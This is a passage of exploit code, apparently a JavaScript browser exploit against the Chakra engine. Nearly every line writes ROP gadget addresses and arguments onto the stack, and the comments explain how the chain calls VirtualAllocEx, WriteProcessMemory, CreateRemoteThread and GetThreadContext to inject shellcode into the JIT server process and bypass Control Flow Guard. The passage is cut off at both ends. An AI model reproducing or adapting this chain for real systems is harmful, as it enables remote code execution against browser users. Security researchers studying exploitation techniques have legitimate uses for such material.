    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // SIZE_T dwSize (R8)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();

    // LPVOID lpAddress (RDX)
    // Let VirtualAllocEx decide where the memory will be located
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();                                                                     // Recall RAX already has a writable pointer in it
    
    // Call KERNELBASE!VirtualAllocEx
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x20) (PAGE_READWRITE)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // WriteProcessMemory() ROP chain
    // Stage 3 -> Write our shellcode into the JIT process

    // Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

    /*
    0:015> dq kernelbase+0x216000+0x4000 L2
    00007fff`58cfa000  00000000`00000000 00000000`00000000
    */
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Also save VirtualAllocEx_allocation+0x58 into another part of the .data section of kernelbase.dll
    // We eventually need to make another call to WriteProcessMemory using VirtualAllocEx_allocation+0x58, so we can just preserve it now
    write64(lowerStack+offset, upperStack, chakraLo+0x26f75a, chakraHigh);       // 0x18026f75a: add rax 0x58 ; ret (Write the address for storage)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a040, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation+0x58
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Also save VirtualAllocEx_allocation+0xc0 into another part of the .data section of kernelbase.dll
    // We eventually need to make another call to WriteProcessMemory using VirtualAllocEx_allocation+0xc0, so we can just preserve it now
    write64(lowerStack+offset, upperStack, chakraLo+0x26f73a, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret (Write the address for storage)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a048, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation+0xc0
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // SIZE_T nSize (R9)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();                                                                     // Recall RAX already has a writable pointer in it

    // LPVOID lpBaseAddress (RDX)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
    next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
    write64(lowerStack+offset, upperStack, chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();

    // LPCVOID lpBuffer (R8) (VirtualProtect ROP chain + shellcode in chakra.dll .data section)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e050+0xd0, chakraHigh);         // .data section of chakra.dll holding our ROP chain + shellcode
    next();

    // Call KERNELBASE!WriteProcessMemory
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // CreateRemoteThread() ROP chain
    // Stage 4 -> Create a thread within the JIT process, but create it suspended
    // This will allow the thread to _not_ execute, because CFG doesn't seem to like executing the specified pointer in CreateRemoteThread with RW-only memory
    // We will update the thread later via another ROP chain to call SetThreadContext()

    // LPTHREAD_START_ROUTINE lpStartAddress (R9)
    // This can be any random data, since it will never be executed, but since we know where our allocation is within the JIT process, we should use that address here
    // CreateRemoteThread can succeed even if this data is junk, but we shouldn't bank on it
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();

    // LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // NULL (default security properties)
    next();

    // SIZE_T dwStackSize (R8)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // 0 (default stack size)
    next();

    // Call KERNELBASE!CreateRemoteThread
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
    next(); 
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
    next();
    write64(lowerStack+offset, upperStack, 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
    next();

    // WriteProcessMemory() ROP chain (Number 2)
    // Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget and pop rdi gadget
    // Comments about this occur at the beginning of the VirtualProtect ROP chain we will inject into the JIT process

    // Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // SIZE_T nSize (R9)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0xffffffff, 0xffffffff);             // Current process
    next();

    // LPVOID lpBaseAddress (RDX)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e050+0xc0, chakraHigh); // .data section of chakra.dll where our final ROP chain is
    next();                                                                       

    // LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
    next();

    // Call KERNELBASE!WriteProcessMemory
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // WriteProcessMemory() ROP chain (Number 3)
    // Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget and pop rdi gadget
    // Comments about this occur at the beginning of the VirtualProtect ROP chain we will inject into the JIT process

    // SIZE_T nSize (R9)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hProcess (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0xffffffff, 0xffffffff);             // Current process
    next();

    // LPVOID lpBaseAddress (RDX)
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e050+0x58, chakraHigh); // .data section of chakra.dll where our final ROP chain is
    next();                                                                       

    // LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
    next();

    // Call KERNELBASE!WriteProcessMemory
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // VirtualAlloc() ROP chain
    // Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext and for use with SetThreadContext

    // DWORD flProtect (R9)
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // LPVOID lpAddress (RCX)
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
    next();

    // SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x000004d0, 0x00000000);             // (0x4d0 bytes)
    next();

    // DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
    write64(lowerStack+offset, upperStack, chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
    next();

    // Call KERNELBASE!VirtualAlloc
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();

    // GetThreadContext() ROP chain
    // Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack and instruction pointer.
    // We will update the RIP member eventually to a simple return address and we will update RSP to point to our VirtualAllocEx allocation

    // First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags. Confirm this with "dt ntdll!_CONTEXT" in WinDbg
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
    next();
